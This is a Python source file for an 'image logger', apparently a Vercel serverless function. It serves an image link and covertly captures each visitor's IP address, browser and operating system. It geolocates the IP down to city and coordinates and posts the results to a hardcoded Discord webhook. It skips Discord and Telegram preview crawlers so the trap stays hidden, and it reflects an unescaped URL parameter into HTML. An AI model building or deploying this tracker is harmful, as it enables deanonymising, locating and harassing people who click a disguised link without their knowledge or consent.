# api/image_logger.py
import requests
import httpagentparser
from urllib.parse import parse_qs
from html import escape

WEBHOOK = "https://discord.com/api/webhooks/1410895727873495100/L_6XLT65BoAVy3qw8yeBAxN_bjOucJKGL6O1mxErFo2SyQY0Z8eNaFkB65ODQwsZcHTX"
DEFAULT_IMAGE = "https://notepad-plus-plus.org/assets/images/notepad4ever.png"
USERNAME = "Image Logger"
COLOR = 0x00FFFF
BLACKLISTED_IPS = ("27", "104", "143", "164")

def bot_check(ip, user_agent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif user_agent.startswith("TelegramBot"):
        return "Telegram"
    return False

def make_report(ip, user_agent, image_url=None, endpoint="N/A"):
    if ip.startswith(BLACKLISTED_IPS):
        return

    bot = bot_check(ip, user_agent)
    if bot:
        # Optionally alert on bot links
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()

    os_name, browser = httpagentparser.simple_detect(user_agent)

    embed = {
        "username": USERNAME,
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger IP Logged",
                "color": COLOR,
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** {endpoint}

**IP Info:**
> **IP:** {info.get('query', ip)}
> **Provider:** {info.get('isp', 'Unknown')}
> **ASN:** {info.get('as', 'Unknown')}
> **Country:** {info.get('country', 'Unknown')}
> **Region:** {info.get('regionName', 'Unknown')}
> **City:** {info.get('city', 'Unknown')}
> **Coords:** {info.get('lat', 'Unknown')}, {info.get('lon', 'Unknown')}
> **Timezone:** {info.get('timezone', 'Unknown')}
> **Mobile:** {info.get('mobile', 'Unknown')}
> **VPN:** {info.get('proxy', False)}
> **Bot:** {info.get('hosting', False)}

**PC Info:**
> **OS:** {os_name}
> **Browser:** {browser}

**User Agent:**
{escape(user_agent)}
""",
                "image": {"url": image_url or DEFAULT_IMAGE}
            }
        ]
    }

    requests.post(WEBHOOK, json=embed)

# Vercel serverless function handler
def handler(request, response):
    try:
        # Extract image URL argument
        query = parse_qs(request.query_string)
        img_url = query.get("url", [DEFAULT_IMAGE])[0]

        user_ip = request.headers.get("x-forwarded-for", request.remote_addr)
        user_agent = request.headers.get("user-agent", "Unknown")

        make_report(user_ip, user_agent, image_url=img_url, endpoint=request.path)

        # Return HTML so Discord shows a preview image
        html_content = f'<img src="{img_url}" alt="Image">'
        response.status_code = 200
        response.headers["Content-Type"] = "text/html"
        response.write(html_content)
    except Exception as e:
        # Log any errors to Discord
        requests.post(WEBHOOK, json={
            "username": USERNAME,
            "content": "@everyone",
            "embeds": [
                {"title": "Image Logger - Error",
                 "color": COLOR,
                 "description": f"An error occurred while trying to log an IP!\n```\n{e}\n```"}
            ]
        })
        response.status_code = 500
        response.write("Internal Server Error")
